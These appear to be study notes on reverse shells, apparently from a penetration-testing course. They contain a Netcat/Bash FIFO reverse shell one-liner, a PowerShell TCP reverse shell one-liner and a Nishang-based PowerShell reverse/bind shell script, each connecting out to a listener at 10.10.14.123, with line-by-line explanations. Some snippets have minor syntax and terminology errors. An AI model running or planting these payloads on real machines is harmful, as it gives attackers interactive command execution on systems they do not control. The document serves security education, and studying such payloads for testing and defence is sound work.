# Examining Shells and Payloads

## The classic Netcat/Bash Reverse Shell One-Liner
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.123 1337 > /tmp/f
```

- `rm -f /tmp/f;` force-removes the `/tmp/f` file, if it exists.

- `mkfifo /tmp/f` creates a `first-in-first-out` named pipe at the location specified. In this case, `/tmp/f` is the FIFO named pipe file.

- `cat /tmp/f |` concatenates the FIFO named pipe file, connecting the standard stdout of `cat /tmp/f` to the  the stdin of the command that comes next.

- `/bin/bash -i 2>&1 |` specifies our command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (2)& stdin data stream (1) are redirected to the command that comes next.

- `nc 10.10.14.123 1337 > /tmp/f` uses Netcat to send a connection to the host on port 1337. The output will be redirected to `/tmp/f`, serving the Bash shell to our waiting listener when the shell gets executed.

## The Powershell One-Liner

```
powershell -nop -c 
	$client = New-Object System.Net.Sockets.TCPClient('10.10.14.123', 443;)
	$stream = $client.GetStream();

	[byte[]]$bytes = 0..65535 | %{0};

	while(
		($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
			;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(
				$bytes,0,$i);

			$sendback = (iex $data 2>&1 | Out-String);
			$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
			$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
			$stream.Write($sendbyte,0,$sendbyte.Length);
			$stream.Flush()
		};
	# $client.Close in order to close when finished...
```

- `powershell -nop -c` executes powershell with no-profile `-nop`, executing the command/script block containted in quotes

- `$client = New-Object` Sets/evaluates the variable of `$client` to equal the New-Object cmdlet, creating a new TCPClient instance.

- `$stream = $client.GetStream()` Sets/evaluates the variable of `$stream` to equal the `$client` variable and the .NET framework method `GetStream`, facilitating the newtork communication.

- `[byte[]]$bytes = 0..65535 | %{0};` creates an empty byte-array called `$bytes` that returns 65,535 zeros as the value of the array. This is essentially an empty byte stream that will be redirected to the TCP listener on the attack box.

- `while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0` starts a while-loop containing the $i variable set equal to the .NET's framework `Stream.Read` method. The parameters: buffer ($bytes), offset by (0), and count ($bytes.Length) are defined inside these parentheses of the mehtod.

- `{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)` Sets/evaluates the variable of $data to equal an ASCII encoding .NET framework class, used in conjunction with the GetString method to encode the byte-stream into ASCII. What we type won't just be transmitted and received as empty bits anymore, but will be encoded as ASCII text so that we can actually read it (while $i != 0);

- `$sendback = (iex $data 2>&1 | Out-String);` Sets/evaluates the variable $sendback equal to the Invoke-Expression cmdlet against the $data variable, then redirects stderr (2>)& stdin (1) through a pip to the Out-String cmdlet, converting input objects into strings. Because Invoke-Expression is used, everyting stored in $data will be run on the local computer.

- `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';` Sets/evaluates the variable $sendback2 equal to the $sendback variable but while appending some quality-of-life path-string and other symbols so that we can actaully tell where we are/what we're doing.

- `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$Stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}` Sets/evaluates the variable $sendbyte equal to the ASCII encoded byte stream

- Using `$client.Close()` will close the connection completely once exited from the stream.

We can turn this into a powershell script. This is an example from `Nishang Project`:

```
[CmdletBinding(DefaultParameterSetName="reverse")] Param(

    [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
    [Parameter(Position = 1, Mandatory = $false, ParameterSetName="bind")]
    [String]
    $IPAddress,

    [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
    [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
    [Int]
    $Port,

    [Parameter(ParameterSetName="reverse")]
    [Switch]
    $Reverse,

    [Parameter(ParameterSetName="bind")]
    [Switch]
    $Bind
)

try {

    if ($Reverse) {
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
    }
    if ($Bind) {
        $listener = [System.Net.Sockets.TcpListener]$Port
        $listener.start()
        $client = $listener.AcceptTcpClient()
    }

    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | %{0}

    $sendbytes = ([text.encoding]::ASCII).GetBytes(
        "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"
        )
    $stream.Write($sendbytes,0,$sendbytes.Length)

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $stream. Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0,$i)
        
        try {
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
        }
        catch {
            Write-Warning "Something went wrong with the execution of command on-tgt."
            Write-Error $_
        }
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()

    if ($listener) {
        $listener.Stop()
    }
    catch {
        Write-Warning "Something went wrong! Check if server reachable and correct port."
        Write-Error $_
    }
}
```

